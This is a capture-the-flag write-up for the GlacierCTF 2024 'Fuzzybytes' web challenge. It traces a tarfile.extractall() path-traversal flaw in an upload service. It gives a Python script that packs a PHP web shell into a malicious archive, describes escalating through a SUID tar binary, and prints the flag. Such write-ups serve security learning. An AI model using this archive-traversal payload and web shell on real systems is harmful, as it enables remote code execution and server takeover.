---------------

### CTF: GLACIER CTF 2024

---------------

![image](https://github.com/user-attachments/assets/cdce91a2-501c-40ed-8017-013608a71987)

---------------

### Challenges

- Web
  - Fuzzybytes

---------------

### Web: Fuzzybytes

![image](https://github.com/user-attachments/assets/bc6606d4-73d5-4934-b393-5305bc210a93)

---------------

### CODE REVIEW

-----------------

- The main sink can be traced with the aid of files `Dockerfile`, `upload.php` and `check_for_malicious_code.py` in the source code archive.
- Dockerfile-:

```docker
# Debian 12
# PHP 8.7.3
# Apache 2.4.59
FROM docker.io/library/php@sha256:b3ff205fcc739fc504750dab29d4c30afb2702730d37a1068a16c14f30a7d48f

RUN apt-get update && apt-get install -y python3 && apt-get clean

# Copy challenge required files
COPY ./config/php.ini $PHP_INI_DIR/php.ini
COPY ./web /var/www/html
COPY ./check_for_malicious_code.py /usr/
COPY ./flag.txt /root/flag.txt

RUN chown www-data:www-data /var/www/html/databases
RUN chmod +s /bin/tar
```

- The docker script copies the content of `web` to `/var/www/html` and copies the python script `check_for_malicious_code.py` to directory `/usr`.

```docker
COPY ./config/php.ini $PHP_INI_DIR/php.ini
COPY ./web /var/www/html
COPY ./check_for_malicious_code.py /usr/
```
- The major ones to note are outlined below,the flag file is copied to `/root/flag.txt` which means we need root privilege to read it.Secondly, ownership of directory `/var/www/html/databases` is granted to user `www-data` and lastly, suid permissions is granted to binary `tar`.

```docker
COPY ./flag.txt /root/flag.txt

RUN chown www-data:www-data /var/www/html/databases
RUN chmod +s /bin/tar
```
- Upload.php-:

```php
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $uploadDir = "/tmp/";
    $targetFile = $uploadDir . basename($_FILES["file"]["name"]);
    $fileExtension = pathinfo($_FILES["file"]["name"], PATHINFO_EXTENSION);
    $allowedExtensions = array('gz');

    echo '<div id="log"></div>';

    if (!in_array($fileExtension, $allowedExtensions)) {
        echo "Sorry, only .tar.gz files are allowed.";
        exit();
    }

    ob_start();

    
    function addLog($message) {
        echo "<script>document.getElementById('log').innerHTML += '$message<br>';</script>";
        ob_flush();
        flush();
    }

    addLog("Unpacking file...");
    
    if (move_uploaded_file($_FILES["file"]["tmp_name"], $targetFile)) {
        addLog("The file " . htmlspecialchars(basename($_FILES["file"]["name"])) . " has been uploaded.");

        if ($fileExtension === 'gz') {
            addLog("Scanning file...");

            // Execute python malware checker
            exec("python3 /usr/check_for_malicious_code.py " . escapeshellarg($targetFile), $output, $returnCode);

            if ($returnCode === 0) {
                addLog("Python script executed successfully.");
            } else {
                addLog("Error executing Python script.");
            }

            unlink($targetFile);
            addLog("Cleaning up...");

            addLog("Done.");

        }
    } else {
        addLog("Sorry, there was an error uploading your file.");
    }

    ob_end_flush();
}
?>



<link rel="stylesheet" type="text/css" href="styles.css">
<a href="index.php" class="back-button">Back to Homepage</a>
```

- The php file takes in a files via the `file` parameter, checks if the file ends with `gz` and only takes in `gzip` archives to prevent upload of php shells.It writes the file to `/tmp` directory.Lastly,it executes the python script that will be explain below and passes the uploaded gzip file as an argument to function `exec()`.We cannot pass in malicious systemcommand because of `escapeshellarg()`.

```php
exec("python3 /usr/check_for_malicious_code.py " . escapeshellarg($targetFile), $output, $returnCode);
```
- The main sink is in the python script which is `tarfile.extractall()`.The function `tarfile.extractall()` is vulnerable to path traversal in the sense that if an archived files is saved as `../../shell.php`,instead of saving it in the current directory.It parses the relative path and moves up 2 directories to save the file.In this scenario,the code extracts our gz file to `/tmp/<dirname>/`,we need to move up two directories to save our php shell in `/var/www/html/databases` since we have write access to it.

```python3
try:
    with tarfile.open(tar_file_path, 'r:gz') as tar:
        if not os.path.exists("/tmp/files_for_checking"):
            os.mkdir("/tmp/files_for_checking")
        tar.extractall("/tmp/files_for_checking")
    print("Successfully extracted the contents of the .tar file.")
```

### Exploitation

- I wrote a python script to create the tarfile.

```python3
#! /usr/bin/env python3
import tarfile
import io

tar = tarfile.TarFile.open('malicious.tar.gz', 'w:gz')

info = tarfile.TarInfo("../../var/www/html/databases/shell.php")
info.mode=0o444 # So it cannot be overwritten
php_shell = b"<?php echo system($_GET['cmd']); ?>"
info.size=len(php_shell)
tar.addfile(info,io.BytesIO(php_shell))
tar.close()
```

- Then,I uploaded it with curl

![image](https://github.com/user-attachments/assets/9df73440-efd6-4ed6-8bd3-d326fa14643e)

- RCE achieved-:

![image](https://github.com/user-attachments/assets/9e01d743-08c4-4759-a13b-10b288b4986a)

- Shell access-:

![image](https://github.com/user-attachments/assets/0d042417-02fc-490f-8275-0353abbc5b3b)

- I read the flag with suid binary `tar`.

![image](https://github.com/user-attachments/assets/34315eb1-3d38-410a-b2e9-c13362d0ab34)

- Flag-:```gctf{c0nGr4tZ_on_Z1p_sLiDinG_4nD_Tar_diving}```

-------------

### Reference-:

- [Mindsdb](https://github.com/mindsdb/mindsdb/security/advisories/GHSA-2g5w-29q9-w6hx)

--------------


